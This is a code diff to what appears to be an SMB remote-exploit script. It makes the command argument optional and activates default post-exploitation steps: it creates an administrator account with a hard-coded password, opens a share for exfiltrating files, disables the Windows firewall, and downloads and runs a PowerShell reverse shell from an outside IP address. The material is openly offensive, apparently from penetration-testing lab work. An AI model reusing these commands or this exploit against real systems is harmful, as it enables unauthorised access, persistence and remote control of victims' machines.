@@ -914,15 +914,17 @@ def smb_pwn(conn, arch):
 
 	print(f'running the command {args.cmd}')
 
-	service_exec(conn, f"cmd /c {args.cmd}")
-	#  # add new user and make admin
-	# service_exec(conn, r'cmd /c net user pood QwEr1234 /add && cmd /c net localgroup Administrators pood /add')
-	# # create a directory to store and exfil files, and share
-	# service_exec(conn, r'cmd /c mkdir c:\\pood && cmd /c net share pood=C:\\pood /grant:pood,FULL')
-	# # Disable firewall
-	# service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
-	# # Get reverse shell 
-	# service_exec(conn, r'cmd /c powershell -c "powershell -E (Invoke-WebRequest -Uri http://192.168.119.213/rshellps1 -UseBasicParsing)"')
+	if args.cmd:
+		service_exec(conn, f"cmd /c {args.cmd}")
+	else:
+		# add new user and make admin
+		service_exec(conn, r'cmd /c net user pood QwEr1234 /add && cmd /c net localgroup Administrators pood /add')
+		# create a directory to store and exfil files, and share
+		service_exec(conn, r'cmd /c mkdir c:\\pood && cmd /c net share pood=C:\\pood /grant:pood,FULL')
+		# Disable firewall
+		service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
+		# Get reverse shell 
+		service_exec(conn, r'cmd /c powershell -c "powershell -E (Invoke-WebRequest -Uri http://192.168.119.213/rshellps1 -UseBasicParsing)"')
 
 
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
@@ -991,7 +993,7 @@ def service_exec(conn, cmd):
 parser = ArgumentParser()
 parser.add_argument("ip", help="The IP address of the vulnerable host.")
 parser.add_argument("-p", "--pipe", help="The named pipe to use", default=None)
-parser.add_argument("cmd", help="The command to run on the vulnerable host.")
+parser.add_argument("-c", "--cmd", help="Run this command on the vulnerable machine.")
 args = parser.parse_args()
 
 target = args.ip
